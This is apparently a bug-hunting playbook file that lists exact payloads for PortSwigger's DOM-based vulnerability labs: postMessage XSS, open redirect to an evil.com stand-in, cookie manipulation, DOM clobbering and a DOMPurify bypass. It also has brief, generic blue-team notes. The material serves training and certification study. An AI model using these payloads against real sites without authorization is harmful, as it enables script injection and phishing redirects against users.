---
name: "DOM-based Vulnerabilities — Complete Deep Dive"
description: "Complete PortSwigger deep-dive with exact payloads for every lab variant including zero-day techniques"
domain: cybersecurity
subdomain: bug-hunting
version: "1.0.0"
category: "bug-hunting/deep-dive-labs"
tags: [portswigger, deep-dive, exploitation, zero-day, lab-solutions]
mitre_attack: ["T1059.007"]
tools: [burp-suite, curl, sqlmap, ffuf, python]
difficulty: "advanced"
---

# DOM-based Vulnerabilities — Complete Deep Dive

> **Deep-Dive Lab Playbook** — Every PortSwigger lab variant with exact payloads,
> bypass techniques, and zero-day extensions. Difficulty: 🟢 Apprentice 🟡 Practitioner 🔴 Expert

## When to Use
- Studying for BSCP (Burp Suite Certified Practitioner) certification
- Testing real-world targets for these vulnerability classes
- Bug bounty hunting — these exact techniques find real bugs
- Building exploitation chains

## Prerequisites
- Burp Suite Professional (Community works for most)
- Browser with proxy configured
- Burp Collaborator or interactsh for OOB testing


## Workflow
### Phase 1: Reconnaissance
- Identify input vectors, parameters, and application behavior.
### Phase 2: Exploitation
- Apply standard lab payloads.
### Phase 3: Zero-Day Escalation
- Fuzz filters, bypass WAFs, and chain with other vulns.

## Lab Playbooks

### Lab 1: DOM XSS web messages 🟡 PRACTITIONER
```html
<iframe src="https://TARGET" onload="this.contentWindow.postMessage('<img src=1 onerror=print()>','*')">
```
Target listens to `message` event and writes to `innerHTML` without origin check.
---

### Lab 2: Web messages + JS URL 🟡 PRACTITIONER
```html
<iframe src="https://TARGET" onload="this.contentWindow.postMessage('javascript:print()//http:','*')">
```
Message handler checks `indexOf('http:')` — append it after `//` comment.
---

### Lab 3: Web messages + JSON.parse 🟡 PRACTITIONER
```html
<iframe src="https://TARGET" onload='this.contentWindow.postMessage("{\"type\":\"load-channel\",\"url\":\"javascript:print()\"}","*")'>
```
---

### Lab 4: DOM open redirection 🟡 PRACTITIONER
```
https://TARGET/post?postId=1&url=https://evil.com
```
---

### Lab 5: DOM cookie manipulation 🟡 PRACTITIONER
```html
<iframe src="https://TARGET/product?productId=1&'><script>print()</script>" onload="if(!window.x)this.src='https://TARGET';window.x=1;">
```
---

### Lab 6: DOM clobbering XSS 🟡 PRACTITIONER
```html
<a id=defaultAvatar><a id=defaultAvatar name=avatar href="1:alert(1)//">
```
Clobbers `defaultAvatar.avatar` property used in `src` attribute.
---

### Lab 7: Clobbering to bypass HTML filters 🔴 EXPERT
```html
<form id=x tabindex=0 onfocus=print()><input id=attributes>
```
Clobbers `element.attributes` so DOMPurify can't enumerate and remove event handlers.
---


## Blue Team Detection
- Monitor access logs for anomalous payloads.
- Implement strict input validation and parameterized queries where applicable.
- Create WAF rules masking generic attack patterns.

## Zero-Day Research Methodology
When a standard technique doesn't work:
1. **Identify the filter**: What chars/patterns are blocked?
2. **Research bypasses**: Search GitHub, Twitter, PortSwigger Research for new techniques
3. **Fuzz extensively**: Use Burp Intruder with custom charset/tag lists
4. **Chain vulnerabilities**: Combine two medium findings into one critical
5. **Check encoding layers**: URL, HTML entity, Unicode, double-encode, XML entity


## Key Concepts
| Concept | Description |
|---------|-------------|
| PortSwigger Vectors | Standardized approaches to vulnerability classes. |
| Payload Encoding | Modifying payloads to bypass basic string matching WAFs. |


## Output Format
```
Vulnerability Deep-Dive Report
==============================
Target Vector: [Endpoint]
Bypass Technique: [Explanation of bypass]
Payload Used: [Payload]
Impact Explanation: [Impact]
```

## 🔵 Blue Team
- Deploy robust WAF rules to detect anomalies.
- Monitor logs for unusual access patterns.

## 🛡️ Remediation & Mitigation Strategy
- **Input Validation:** Sanitize and strictly type-check all inputs.
- **Least Privilege:** Constrain component execution bounds.


## 📚 Shared Resources
> For cross-cutting methodology applicable to all vulnerability classes, see:
> - [`_shared/references/elite-chaining-strategy.md`](../_shared/references/elite-chaining-strategy.md) — Exploit chaining methodology and high-payout chain patterns
> - [`_shared/references/elite-report-writing.md`](../_shared/references/elite-report-writing.md) — HackerOne-optimized report writing, CWE quick reference
> - [`_shared/references/real-world-bounties.md`](../_shared/references/real-world-bounties.md) — Verified disclosed bounties by vulnerability class

## References
- [PortSwigger Web Security Academy](https://portswigger.net/web-security)
- [PortSwigger All Labs](https://portswigger.net/web-security/all-labs)
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)
